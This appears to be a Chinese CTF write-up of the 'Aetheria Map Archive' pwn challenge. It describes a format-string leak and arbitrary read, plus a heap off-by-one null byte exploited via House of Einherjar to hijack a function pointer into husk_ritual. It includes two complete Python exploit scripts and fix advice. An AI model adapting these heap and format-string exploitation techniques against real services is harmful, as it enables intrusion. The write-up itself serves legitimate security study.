---
layout: post
title: Aetheria Map Archive：堆 off-by-one 与函数指针劫持
summary: 一个有 PIE、Full RELRO、Canary 的 pwn 题，最后靠 House of Einherjar 把 Scribe 的函数指针换成 husk_ritual。
tags: pwn 堆利用 格式化字符串
date: 2026-10-18 09:10:00 +0800
---

## 1. 题目概况

附件 `aetheria_pwn_source.zip` 含完整源码与二进制：

- `server.cpp`：服务端，监听 `0.0.0.0:7777`
- `aetheria_server`：编译产物
- `Dockerfile` / `docker-compose.yml` / `entrypoint.sh`：ubuntu:20.04 环境
- `tutorial_chamber.aethmap`：示例地图

二进制保护：

```
PIE          : yes
Full RELRO   : yes（GOT 不可写）
NX           : yes
Canary       : yes
FORTIFY      : 是（dprintf 被替换为 __dprintf_chk）
```

`handle_client()` 开头执行 `close(0/1/2)` 后 `dup2(fd, 0/1/2)`，因此进程的 stdout/stderr 就是攻击者连接。这一点决定了最终的取 flag 方式：`husk_ritual()` 内部 `system("cat /flag.txt")` 的输出会直接回到 socket。

## 2. 协议与数据结构

文本行协议：

```
LIST
SHOW <id>
UPLOAD <n>      # 随后 n 字节 aethmap
PATCH <id> <n>  # 随后 n 字节
WRITE <id> <n>  # 随后 n 字节
SCRIBE <id>
SEAL <id>
RELEASE <id>
DELETE <id>
CHANT
```

aethmap 布局（`n >= 0xE0`）：

| 偏移 | 长度 | 含义 |
|------|------|------|
| 0x00 | 4 | `"AETH"` |
| 0x06 | 2 | width |
| 0x08 | 2 | height |
| 0x10 | 0x2f | map_name |
| 0x40 | 0x1f | author_name |
| 0x60 | 0x7f | description |

`HostedMap`（`calloc(1,0x48)` → chunk 0x50）：

| 偏移 | 字段 |
|------|------|
| 0x00 | id / width / height |
| 0x08 | map_name |
| 0x10 | author_name |
| 0x18 | description |
| 0x20 | scroll（`malloc(0x4f0)`，chunk 0x500） |
| 0x28 | wall（`malloc(0x4f0)`） |
| 0x30 | guard（`malloc(0x30)`） |
| 0x38 | scribe |
| 0x40 | wall_released |
| 0x41 | deleted |

`Scribe`（`malloc(0x40)`）：`target(0)` / `limit(8)` / `seal(0x10)`。`SEAL` 即 `m->scribe->seal(m->scribe->target, m->scribe->limit, 0, 0)` —— 这是唯一的间接调用点。`husk_ritual()` 签名与之兼容，内部执行 `system("cat /flag.txt")`。

## 3. 两个缺陷

### 3.1 格式化字符串（信息泄露）

```c
dprintf(fd, m->author_name, puts, malloc, free, husk_ritual, archive_note());
```

`author_name` 被当作格式串，且寄存器可变参数恰好是 libc 函数地址与 `husk_ritual`：

- `%p` 连续读取可直接得到 `puts` / `malloc` / `free` / `husk_ritual`（`rdx/rcx/r8/r9`）
- 第 6、7 个可变参数是 `description` 前 16 字节（可控 qword），因此 `"%c%c%c%c%c%s%s"` 可以解引用任意地址，形成任意读

写入受限：二进制使用 `__dprintf_chk`，堆上的格式串触发 glibc 的 `*** %n in writable segment detected ***` 并 abort，`%n` 不可用。

### 3.2 PATCH 的越界终止符（堆 off-by-one）

```c
if (n > SCROLL_SIZE + 8) n = SCROLL_SIZE + 8;   // 0x4f8
char buf[SCROLL_SIZE + 8];
read_exact(fd, buf, n);
memcpy(m->scroll, buf, n);
m->scroll[n] = 0;
```

`malloc(0x4f0)` 的 chunk 大小是 0x500，可用区正好 0x4f8。取 `n = 0x4f8` 时：

- `memcpy` 覆盖到紧随其后 wall chunk 的 `prev_size`（8 字节，完全可控）
- `m->scroll[0x4f8] = 0` 把 wall chunk 的 size 低字节从 `0x501` 改成 `0x500`，清掉 `PREV_INUSE`

## 4. 利用

目标：把 `Scribe.seal` 改成 `husk_ritual`，再 `SEAL 1`。

### 4.1 布局

```
map1: H1(0x50) name1(0x50) auth1(0x50) desc1(0xa0) scroll1(0x500) wall1(0x500) guard1(0x40)
SCRIBE 1: S1(0x50)
map2: H2 name2 auth2 desc2 scroll2 wall2 guard2
```

记 `A = scroll1` 的用户地址，则 wall2 的 chunk 头为 `W2 = wall2 - 0x10`。

### 4.2 House of Einherjar

1. `PATCH 1` 发 0x4f8 字节，在 `P = A + 0x4c0` 处伪造一个 chunk：

```
[P + 0x08] = prev | 1     ; fake size
[P + 0x10] = P            ; fd
[P + 0x18] = P            ; bk
[P + 0x20] = 0            ; fd_nextsize（size >= 0x400 时 unlink 会检查）
[P + 0x28] = 0            ; bk_nextsize
```

2. `PATCH 2` 发 0x4f8 字节，在 `offset 0x4f0` 写入 `prev = (wall2 - 0x10) - P`；命令末尾的 `m->scroll[0x4f8] = 0` 同时清掉 wall2 的 `PREV_INUSE`。

3. `RELEASE 2` 触发 `free(wall2)`：`prev_inuse == 0` → 向后合并到 `P`，`chunksize(P) == prev` 通过、`fd->bk == bk->fd == P` 通过，得到一个横跨 `guard1 / S1 / map2 各 chunk` 的大空闲块。

### 4.3 用 UPLOAD 覆盖 Scribe

`UPLOAD` 的 `std::vector<uint8_t> raw(n)` 是攻击者可控大小的堆分配。把它设成 `n = (S1 - (P + 0x10)) + 0x40`（16 字节对齐），该分配会从合并块的首部切出，用户数据正好落在 `S1` 上：

```
raw[off + 0x00] = target   (任意)
raw[off + 0x08] = 0x40     (limit)
raw[off + 0x10] = husk_ritual
```

随后 `SEAL 1` → `husk_ritual()` → `system("cat /flag.txt")`，输出经 `dup2` 直接回到 socket。

### 4.4 关键偏移

```
A    = SHOW 1 得到的 scroll
P    = A + 0x4c0
prev = (wall2 - 0x10) - P
off  = S1 - (P + 0x10)
n    = align16(off + 0x40)
```

脚本在发招前会校验 `wall1 - scroll1 == 0x500`、`wall2 - scroll2 == 0x500`、`A < S1 < wall2`，不满足则退出，避免打坏实例。

## 5. 复现

```bash
docker pull ubuntu:20.04
cd aetheria_pwn_source && docker build -t aetheria_local .
docker run -d --name aeth -p 7777:7777 -e FLAG='NSSCTF{LOCAL_AETHERIA_OK_2024}' aetheria_local
python3 pwn.py
```

一次成功输出的关键片段：

```
uploaded by 0x7fdd9b351420.0x7fdd9b3670e0.0x7fdd9b3676d0.0x55b5cf955588
scribe=0x55b5f5802b90
scroll=0x55b5f5802130 wall=0x55b5f5802630
scroll=0x55b5f5802d70 wall=0x55b5f5803270
P=0x55b5f58025f0 prev=0xc70 off=0x590
PATCH 1/2 -> patched ; RELEASE 2 -> wall released
cover upload n=0x5d0 -> map 3 stored
SEAL 1 ->
NSSCTF{LOCAL_AETHERIA_OK_2024}
sealed
```

重建容器、更换 flag 连续运行 3 次，均成功。

## 6. 修复建议

- `PATCH` 的长度上限改为真实可用区（`n <= 0x4f0`），去掉越界的终止符写
- `dprintf(fd, "%s", m->author_name)`，不要把用户数据当格式串
- 避免在堆对象里保存裸函数指针并跨生命周期使用；`SCRIBE`/`SEAL` 改为固定枚举 + 查表
- `delete_map` 应置空指针并释放 `scribe`

## 7. 脚本

### 7.1 `pwn.py` —— 端到端利用

```python
#!/usr/bin/env python3
"""Aetheria Map Archive - local exploit (House of Einherjar -> Scribe.seal -> husk_ritual)

Chain:
 1) UPLOAD map1 (author = format string to leak husk_ritual through __dprintf_chk varargs)
 2) SCRIBE 1 -> Scribe object S1 (malloc 0x40 => chunk 0x50)
 3) UPLOAD map2 -> its scroll/wall directly follow map1's chunks
 4) PATCH 1 : craft fake chunk P inside scroll1 (P = scroll1+0x4c0), fd=bk=P
 5) PATCH 2 : wall2->prev_size = wall2 - P, and off-by-one null clears wall2 PREV_INUSE
 6) RELEASE 2: free(wall2) -> backward coalesce to P => free chunk spanning S1
 7) UPLOAD with a controlled-size raw vector: allocated from front of that free chunk (P),
    its bytes land on S1 -> overwrite S1->seal = husk_ritual
 8) SEAL 1 -> husk_ritual() -> system("cat /flag.txt"), stdout is dup2'ed to our socket
"""
import socket, struct, time, subprocess, re, sys

HOST, PORT = "127.0.0.1", 7777
CONTAINER = "aeth"

def ensure():
    st = subprocess.run(["docker","inspect","-f","{{.State.Running}}",CONTAINER],
                        capture_output=True,text=True).stdout.strip()
    if st != "true":
        subprocess.run(["docker","start",CONTAINER],capture_output=True); time.sleep(1.2)

class Conn:
    def __init__(self):
        self.s = socket.create_connection((HOST,PORT), timeout=5); self.buf=b""
    def recv_until(self, tok=b"> ", timeout=6):
        end=time.time()+timeout
        while tok not in self.buf:
            self.s.settimeout(max(0.05,end-time.time()))
            try: d=self.s.recv(65536)
            except socket.timeout: break
            if not d: break
            self.buf+=d
        i=self.buf.find(tok)
        if i>=0:
            out,self.buf=self.buf[:i+len(tok)],self.buf[i+len(tok):]; return out
        out,self.buf=self.buf,b""; return out
    def cmd(self, line):
        self.s.sendall(line+b"\n"); return self.recv_until()

def aethmap(n, name=b"", author=b"", desc=b""):
    b=bytearray(n)
    if n>=4: b[0:4]=b"AETH"
    if n>=0x10:
        b[4:6]=b"\x01\x00"
        struct.pack_into("<H",b,6,55); struct.pack_into("<H",b,8,17)
        b[0x10:0x10+len(name)]=name
        b[0x40:0x40+len(author)]=author
        b[0x60:0x60+len(desc)]=desc[:0x7f]
    return bytes(b)

def upload(c, payload):
    c.s.sendall(b"UPLOAD %d\n"%len(payload)+payload)
    return c.recv_until()

def show(c, mid):
    out=c.cmd(b"SHOW %d"%mid)
    d={}
    for k in ("scroll","wall","scribe"):
        g=re.search((k+r"=(0x[0-9a-f]+|\(nil\))").encode(), out)
        d[k]=int(g.group(1),16) if g and g.group(1)!=b"(nil)" else None
    return out,d

def patch(c, mid, data):
    assert len(data)<=0x4f8
    c.s.sendall(b"PATCH %d %d\n"%(mid,len(data))+data)
    return c.recv_until()

def main():
    ensure()
    c=Conn(); banner=c.recv_until()
    print("[*] banner:", banner)

    # --- map1 + leak husk_ritual via format string author ---
    out=upload(c, aethmap(0xE0, name=b"LEAK", author=b"%p.%p.%p.%p"))
    print("[*] map1 upload:", out)
    vals=[int(x,16) for x in re.findall(rb"0x[0-9a-f]+", out.split(b"by",1)[1].split(b"\n")[0])]
    puts,malloc,free,husk=vals[:4]
    print("    puts=%#x malloc=%#x free=%#x husk_ritual=%#x"%(puts,malloc,free,husk))

    print("[*] SCRIBE 1:", c.cmd(b"SCRIBE 1"))
    o1,s1=show(c,1); print("[*] SHOW 1:", o1)
    A=s1["scroll"]; W1=s1["wall"]; S1=s1["scribe"]

    # --- map2 ---
    print("[*] map2 upload:", upload(c, aethmap(0xE0, name=b"M2", author=b"M2")))
    o2,s2=show(c,2); print("[*] SHOW 2:", o2)
    A2=s2["scroll"]; W2=s2["wall"]

    print("[i] A=%#x W1=%#x S1=%#x A2=%#x W2=%#x"%(A,W1,S1,A2,W2))
    ok=True
    if W1 != A+0x500: print("[!] wall1 - scroll1 != 0x500"); ok=False
    if W2 != A2+0x500: print("[!] wall2 - scroll2 != 0x500"); ok=False
    if W2 <= A: print("[!] map2 not after map1"); ok=False
    if not (A < S1 < W2): print("[!] scribe not between map1 and wall2"); ok=False
    if not ok: print("[FAIL] heap layout unexpected, aborting"); return 1

    P = A+0x4c0                    # fake chunk header, inside scroll1 (writable)
    prev = (W2-0x10) - P           # prev_size of wall2 -> merge reaches P
    off = S1 - (P+0x10)            # offset of Scribe data inside raw vector
    print("[i] P=%#x prev=%#x S1_offset_in_raw=%#x"%(P,prev,off))
    if prev % 0x10 or prev < 0x30 or off < 0x30:
        print("[FAIL] bad geometry"); return 1

    # --- PATCH 1 : fake chunk at P inside scroll1 ---
    b1=bytearray(0x4f8)
    struct.pack_into("<Q", b1, 0x4c0, 0)          # fake prev_size (unused)
    struct.pack_into("<Q", b1, 0x4c8, prev|1)     # fake size == prev_size (chunksize masks flags)
    struct.pack_into("<Q", b1, 0x4d0, P)          # fd = P
    struct.pack_into("<Q", b1, 0x4d8, P)          # bk = P
    struct.pack_into("<Q", b1, 0x4e0, 0)          # fd_nextsize = NULL
    struct.pack_into("<Q", b1, 0x4e8, 0)          # bk_nextsize = NULL
    print("[*] PATCH 1:", patch(c,1,bytes(b1)))

    # --- PATCH 2 : wall2->prev_size = prev, null clears its PREV_INUSE ---
    b2=bytearray(0x4f8)
    struct.pack_into("<Q", b2, 0x4f0, prev)
    print("[*] PATCH 2:", patch(c,2,bytes(b2)))

    # --- trigger House of Einherjar ---
    print("[*] RELEASE 2:", c.cmd(b"RELEASE 2"))

    # --- carve from the merged chunk with an attacker-sized raw vector ---
    n = (off + 0x40 + 0xf) & ~0xf
    nb = (n + 8 + 0xf) & ~0xf
    merged = (W2-0x10-P) + 0x500
    print("[i] raw n=%#x nb=%#x merged=%#x"%(n,nb,merged))
    if nb + 0x20 > merged: print("[FAIL] raw too large for merged chunk"); return 1
    pay=bytearray(aethmap(n, name=b"PWN", author=b"PWN", desc=b"D"))
    struct.pack_into("<Q", pay, off+0x00, 0)       # Scribe.target
    struct.pack_into("<Q", pay, off+0x08, 0x40)    # Scribe.limit
    struct.pack_into("<Q", pay, off+0x10, husk)    # Scribe.seal = husk_ritual
    out=upload(c, bytes(pay))
    print("[*] cover upload:", out)

    # --- fire ---
    c.s.sendall(b"SEAL 1\n")
    time.sleep(1.0)
    data=c.recv_until(timeout=2)
    print("[*] SEAL 1 response:\n"+data.decode("latin-1"))
    print("[*] docker logs tail:")
    print(subprocess.run(["docker","logs","--tail","5",CONTAINER],capture_output=True,text=True).stdout[-500:])
    return 0

if __name__=="__main__":
    sys.exit(main())
```

### 7.2 `arb_read.py` —— 格式化串任意读的最小验证

```python
#!/usr/bin/env python3
"""Demonstrate arbitrary read through the format string:
   args 6/7 are the first 16 bytes of `description` (attacker controlled qwords),
   so "%c%c%c%c%c%s" dereferences an attacker-chosen pointer."""
import sys, struct, re
sys.path.insert(0, ".")          # 复用同目录的 pwn.py（这里的 pwn 是本目录那个，不是 pwntools）
from pwn import Conn, aethmap, upload, show, patch   # reuse helpers

def run():
    c=Conn(); c.recv_until()
    out=upload(c, aethmap(0xE0, name=b"LEAK", author=b"%p.%p.%p.%p"))
    vals=[int(x,16) for x in re.findall(rb"0x[0-9a-f]+", out.split(b"by",1)[1].split(b"\n")[0])]
    husk=vals[3]
    print("[i] husk=%#x"%husk)
    c.cmd(b"SCRIBE 1")
    o,s=show(c,1); S1=s["scribe"]; A=s["scroll"]
    print("[i] scroll=%#x scribe=%#x"%(A,S1))
    # read Scribe object (target ptr, limit=0x40, seal ptr) as a string
    desc=struct.pack("<Q",S1)+struct.pack("<Q",S1+8)
    out=upload(c, aethmap(0xE0, name=b"R", author=b"%c%c%c%c%c%s%s", desc=desc))
    print("[i] %c*5 + %s%s  ->", out.split(b"by",1)[1][:120])
    c.s.close()

if __name__=="__main__":
    run()
```

两份也可直接下载：[`pwn.py`](/assets/files/aetheria/pwn.py)、[`arb_read.py`](/assets/files/aetheria/arb_read.py)。
